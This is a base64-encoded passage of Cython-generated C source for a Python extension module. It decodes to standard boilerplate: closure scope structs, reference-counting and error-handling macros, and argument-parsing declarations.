9QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xIFB5Q3JpdGljYWxTZWN0aW9uX0JlZ2luCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4yIFB5Q3JpdGljYWxTZWN0aW9uMl9CZWdpbgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDEgUHlDcml0aWNhbFNlY3Rpb25fRW5kCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMiBQeUNyaXRpY2FsU2VjdGlvbjJfRW5kCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG8pIHsKI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpIH0KI2Vsc2UKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04KI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTiBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTgojZW5kaWYKCgoKCgoKc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGw7CnN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHI7CnN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7CnN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHI7CnN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHI7CgoKc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgewogIFB5T2JqZWN0X0hFQUQKICBQeU9iamVjdCAqX19weXhfdl9zZWxmOwp9OwoKCgpzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByIHsKICBQeU9iamVjdF9IRUFECiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgKl9fcHl4X291dGVyX3Njb3BlOwogIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wOwogIFB5T2JqZWN0ICpfX3B5eF92X2k7Cn07CgoKCnN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgewogIFB5T2JqZWN0X0hFQUQKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqX19weXhfb3V0ZXJfc2NvcGU7CiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaTsKfTsKCgoKc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciB7CiAgUHlPYmplY3RfSEVBRAogIHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICpfX3B5eF9vdXRlcl9zY29wZTsKICBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMDsKICBQeU9iamVjdCAqX19weXhfdl9pOwp9OwoKCgpzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByIHsKICBQeU9iamVjdF9IRUFECiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZnV0dXJlOwogIFB5T2JqZWN0ICpfX3B5eF90XzA7CiAgUHlfc3NpemVfdCBfX3B5eF90XzE7CiAgUHlfc3NpemVfdCBfX3B5eF90XzI7CiAgaW50IF9fcHl4X3RfMzsKfTsKCgoKCgojaWZuZGVmIENZVEhPTl9SRUZOQU5OWQogICNkZWZpbmUgQ1lUSE9OX1JFRk5BTk5ZIDAKI2VuZGlmCiNpZiBDWVRIT05fUkVGTkFOTlkKICB0eXBlZGVmIHN0cnVjdCB7CiAgICB2b2lkICgqSU5DUkVGKSh2b2lkKiwgUHlPYmplY3QqLCBQeV9zc2l6ZV90KTsKICAgIHZvaWQgKCpERUNSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpOwogICAgdm9pZCAoKkdPVFJFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7CiAgICB2b2lkICgqR0lWRVJFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7CiAgICB2b2lkKiAoKlNldHVwQ29udGV4dCkoY29uc3QgY2hhciosIFB5X3NzaXplX3QsIGNvbnN0IGNoYXIqKTsKICAgIHZvaWQgKCpGaW5pc2hDb250ZXh0KSh2b2lkKiopOwogIH0gX19QeXhfUmVmTmFubnlBUElTdHJ1Y3Q7CiAgc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueSA9IE5VTEw7CiAgc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueUltcG9ydEFQSShjb25zdCBjaGFyICptb2RuYW1lKTsKICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zIHZvaWQgKl9fcHl4X3JlZm5hbm55ID0gTlVMTDsKICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KG5hbWUsIGFjcXVpcmVfZ2lsKVwKICAgICAgICAgIGlmIChhY3F1aXJlX2dpbCkge1wKICAgICAgICAgICAgICBQeUdJTFN0YXRlX1NUQVRFIF9fcHl4X2dpbHN0YXRlX3NhdmUgPSBQeUdJTFN0YXRlX0Vuc3VyZSgpO1wKICAgICAgICAgICAgICBfX3B5eF9yZWZuYW5ueSA9IF9fUHl4X1JlZk5hbm55LT5TZXR1cENvbnRleHQoKG5hbWUpLCAoX19MSU5FX18pLCAoX19GSUxFX18pKTtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9SZWxlYXNlKF9fcHl4X2dpbHN0YXRlX3NhdmUpO1wKICAgICAgICAgIH0gZWxzZSB7XAogICAgICAgICAgICAgIF9fcHl4X3JlZm5hbm55ID0gX19QeXhfUmVmTmFubnktPlNldHVwQ29udGV4dCgobmFtZSksIChfX0xJTkVfXyksIChfX0ZJTEVfXykpO1wKICAgICAgICAgIH0KICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dE5vZ2lsKCkge1wKICAgICAgICAgICAgICBQeUdJTFN0YXRlX1NUQVRFIF9fcHl4X2dpbHN0YXRlX3NhdmUgPSBQeUdJTFN0YXRlX0Vuc3VyZSgpO1wKICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9SZWxlYXNlKF9fcHl4X2dpbHN0YXRlX3NhdmUpO1wKICAgICAgICAgIH0KICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dE5vZ2lsKCkge1wKICAgICAgICAgICAgICBQeUdJTFN0YXRlX1NUQVRFIF9fcHl4X2dpbHN0YXRlX3NhdmUgPSBQeUdJTFN0YXRlX0Vuc3VyZSgpO1wKICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9SZWxlYXNlKF9fcHl4X2dpbHN0YXRlX3NhdmUpO1wKICAgICAgICAgIH0KICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpXAogICAgICAgICAgX19QeXhfUmVmTmFubnktPkZpbmlzaENvbnRleHQoJl9fcHl4X3JlZm5hbm55KQogICNkZWZpbmUgX19QeXhfSU5DUkVGKHIpICBfX1B5eF9SZWZOYW5ueS0+SU5DUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpCiAgI2RlZmluZSBfX1B5eF9ERUNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5ERUNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSkKICAjZGVmaW5lIF9fUHl4X0dPVFJFRihyKSAgX19QeXhfUmVmTmFubnktPkdPVFJFRihfX3B5eF9yZWZuYW5ueSwgKFB5T2JqZWN0ICopKHIpLCAoX19MSU5FX18pKQogICNkZWZpbmUgX19QeXhfR0lWRVJFRihyKSBfX1B5eF9SZWZOYW5ueS0+R0lWRVJFRihfX3B5eF9yZWZuYW5ueSwgKFB5T2JqZWN0ICopKHIpLCAoX19MSU5FX18pKQogICNkZWZpbmUgX19QeXhfWElOQ1JFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0lOQ1JFRihyKTsgfX0gd2hpbGUoMCkKICAjZGVmaW5lIF9fUHl4X1hERUNSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9ERUNSRUYocik7IH19IHdoaWxlKDApCiAgI2RlZmluZSBfX1B5eF9YR09UUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfR09UUkVGKHIpOyB9fSB3aGlsZSgwKQogICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocikgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0dJVkVSRUYocik7fX0gd2hpbGUoMCkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dChuYW1lLCBhY3F1aXJlX2dpbCkKICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dE5vZ2lsKCkKICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpCiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgUHlfSU5DUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9ERUNSRUYocikgUHlfREVDUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9HT1RSRUYocikKICAjZGVmaW5lIF9fUHl4X0dJVkVSRUYocikKICAjZGVmaW5lIF9fUHl4X1hJTkNSRUYocikgUHlfWElOQ1JFRihyKQogICNkZWZpbmUgX19QeXhfWERFQ1JFRihyKSBQeV9YREVDUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9YR09UUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9YR0lWRVJFRihyKQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeV9YREVDUkVGX1NFVChyLCB2KSBkbyB7XAogICAgICAgIFB5T2JqZWN0ICp0bXAgPSAoUHlPYmplY3QgKikgcjtcCiAgICAgICAgciA9IHY7IFB5X1hERUNSRUYodG1wKTtcCiAgICB9IHdoaWxlICgwKQojZGVmaW5lIF9fUHl4X1hERUNSRUZfU0VUKHIsIHYpIGRvIHtcCiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1wKICAgICAgICByID0gdjsgX19QeXhfWERFQ1JFRih0bXApO1wKICAgIH0gd2hpbGUgKDApCiNkZWZpbmUgX19QeXhfREVDUkVGX1NFVChyLCB2KSBkbyB7XAogICAgICAgIFB5T2JqZWN0ICp0bXAgPSAoUHlPYmplY3QgKikgcjtcCiAgICAgICAgciA9IHY7IF9fUHl4X0RFQ1JFRih0bXApO1wKICAgIH0gd2hpbGUgKDApCiNkZWZpbmUgX19QeXhfQ0xFQVIocikgICAgZG8geyBQeU9iamVjdCogdG1wID0gKChQeU9iamVjdCopKHIpKTsgciA9IE5VTEw7IF9fUHl4X0RFQ1JFRih0bXApO30gd2hpbGUoMCkKI2RlZmluZSBfX1B5eF9YQ0xFQVIocikgICBkbyB7IGlmKChyKSAhPSBOVUxMKSB7UHlPYmplY3QqIHRtcCA9ICgoUHlPYmplY3QqKShyKSk7IHIgPSBOVUxMOyBfX1B5eF9ERUNSRUYodG1wKTt9fSB3aGlsZSgwKQoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycikgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoX19weXhfdHN0YXRlLCBlcnIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShQeVRocmVhZFN0YXRlKiB0c3RhdGUsIFB5T2JqZWN0KiBlcnIpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKSAgUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpCiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUgIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZTsKI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbiAgX19weXhfdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50OwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgojZGVmaW5lIF9fUHl4X1B5RXJyX09jY3VycmVkKCkgIChfX3B5eF90c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uICE9IE5VTEwpCiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPyAoUHlPYmplY3QqKSBQeV9UWVBFKF9fcHl4X3RzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24pIDogKFB5T2JqZWN0KikgTlVMTCkKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoX19weXhfdHN0YXRlLT5jdXJleGNfdHlwZSAhPSBOVUxMKQojZGVmaW5lIF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCkgIChfX3B5eF90c3RhdGUtPmN1cmV4Y190eXBlKQojZW5kaWYKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgojZGVmaW5lIF9fUHl4X1B5RXJyX09jY3VycmVkKCkgIChQeUVycl9PY2N1cnJlZCgpICE9IE5VTEwpCiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgUHlFcnJfT2NjdXJyZWQoKQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiNkZWZpbmUgX19QeXhfUHlFcnJfQ2xlYXIoKSBfX1B5eF9FcnJSZXN0b3JlKE5VTEwsIE5VTEwsIE5VTEwpCiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZSh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZShQeVRocmVhZFN0YXRlX0dFVCgpLCB0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgICBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZV9HRVQoKSwgdHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmUodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2godHlwZSwgdmFsdWUsIHRiKSAgICBfX1B5eF9FcnJGZXRjaEluU3RhdGUoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyckZldGNoSW5TdGF0ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE2CiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIChQeV9JTkNSRUYoZXhjKSwgX19QeXhfRXJyUmVzdG9yZSgoZXhjKSwgTlVMTCwgTlVMTCkpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIFB5RXJyX1NldE5vbmUoZXhjKQojZW5kaWYKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUVycl9DbGVhcigpIFB5RXJyX0NsZWFyKCkKI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpCiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZSh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJGZXRjaFdpdGhTdGF0ZSh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9GZXRjaCh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJGZXRjaEluU3RhdGUodHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9GZXRjaCh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9GZXRjaCh0eXBlLCB2YWx1ZSwgdGIpCiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSk7CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvLG4pIFB5T2JqZWN0X0dldEF0dHIobyxuKQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSk7CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmFtZShQeU9iamVjdCAqbmFtZSk7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMaXN0X0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKTsKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX01FVEhfRkFTVENBTEwKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pOwojZW5kaWYKCgojaW5jbHVkZSA8c3RyaW5nLmg+CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5Qnl0ZXNfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlVbmljb2RlX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscyk7CgoKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAjZGVmaW5lIF9fUHl4X0FyZ1JlZl9WQVJBUkdTKGFyZ3MsIGkpIF9fUHl4X1B5U2VxdWVuY2VfSVRFTShhcmdzLCBpKQojZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAjZGVmaW5lIF9fUHl4X0FyZ1JlZl9WQVJBUkdTKGFyZ3MsIGkpIF9fUHl4X05ld1JlZihfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGFyZ3MsIGkpKQojZWxzZQogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9YTmV3UmVmKFB5VHVwbGVfR2V0SXRlbShhcmdzLCBpKSkKI2VuZGlmCiNkZWZpbmUgX19QeXhfTnVtS3dhcmdzX1ZBUkFSR1Moa3dkcykgUHlEaWN0X1NpemUoa3dkcykKI2RlZmluZSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKGFyZ3MsIG5hcmdzKSBOVUxMCiNkZWZpbmUgX19QeXhfR2V0S3dWYWx1ZV9WQVJBUkdTKGt3LCBrd3ZhbHVlcywgcykgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3Ioa3csIHMpCiNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X1ZBUkFSR1Moa3csIGt3dmFsdWVzKSBQeURpY3RfQ29weShrdykKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgICAjZGVmaW5lIF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChhcmdzLCBpKSBfX1B5eF9OZXdSZWYoYXJnc1tpXSkKICAgICNkZWZpbmUgX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKGt3ZHMpIF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoa3dkcykKICAgICNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoYXJncywgbmFyZ3MpICgoYXJncykgKyAobmFyZ3MpKQogICAgc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9HZXRLd1ZhbHVlX0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzLCBQeU9iamVjdCAqcyk7CiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIENZVEhPTl9VTlVTRUQgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMpOwogICNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X0t3YXJnc0FzRGljdF9GQVNUQ0FMTChrdywga3d2YWx1ZXMpIF9QeVN0YWNrX0FzRGljdChrd3ZhbHVlcywga3cpCiAgI2VuZGlmCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTCBfX1B5eF9BcmdSZWZfVkFSQVJHUwogICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwgX19QeXhfTnVtS3dhcmdzX1ZBUkFSR1MKICAgICNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwgX19QeXhfS3dWYWx1ZXNfVkFSQVJHUwogICAgI2RlZmluZSBfX1B5eF9HZXRLd1ZhbHVlX0ZBU1RDQUxMIF9fUHl4X0dldEt3VmFsdWVfVkFSQVJHUwogICAgI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwgX19QeXhfS3dhcmdzQXNEaWN0X1ZBUkFSR1MKI2VuZGlmCiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX1ZBUkFSR1MoYXJncywgc3RhcnQsIHN0b3ApIFB5VHVwbGVfR2V0U2xpY2UoYXJncywgc3RhcnQsIHN0b3ApCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTKQojZGVmaW5lIF9fUHl4X0FyZ3NTbGljZV9GQVNUQ0FMTChhcmdzLCBzdGFydCwgc3RvcCkgX19QeXhfUHlUdXBsZV9Gcm9tQXJyYXkoYXJncyArIHN0YXJ0LCBzdG9wIC0gc3RhcnQpCiNlbHNlCiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX0ZBU1RDQUxMKGFyZ3MsIHN0YXJ0LCBzdG9wKSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIHN0YXJ0LCBzdG9wKQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoY29uc3QgY2hhciogZnVuY19uYW1lLCBQeU9iamVjdCoga3dfbmFtZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoCiAgICBQeU9iamVjdCAqa3dkcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsIFB5X3NzaXplX3QgbnVtX2t3YXJncywKICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsCiAgICBpbnQgaWdub3JlX3Vua25vd25fa3dhcmdzCik7CgoKI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKVwKICAgICgoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncykKI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uV2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCBrd2FyZ3MpXAogICAgKChQeUNGdW5jdGlvbldpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSkoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzLCBrd2FyZ3MpCiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIG5hcmdzKVwKICAgICgoX19QeXhfUHlDRnVuY3Rpb25GYXN0KSh2b2lkKCopKHZvaWQpKShQeUNGdW5jdGlvbikoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzLCBuYXJncykKI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXAogICAgKChfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpKFB5Q0Z1bmN0aW9uKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MsIG5hcmdzLCBrd25hbWVzKQoKCiNpZiBDWVRIT05fRkFTVF9QWUNBTEwKI2lmICFDWVRIT05fVkVDVE9SQ0FMTAojZGVmaW5lIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGwoZnVuYywgYXJncywgbmFyZ3MpXAogICAgX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoKGZ1bmMpLCAoYXJncyksIChuYXJncyksIE5VTEwpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0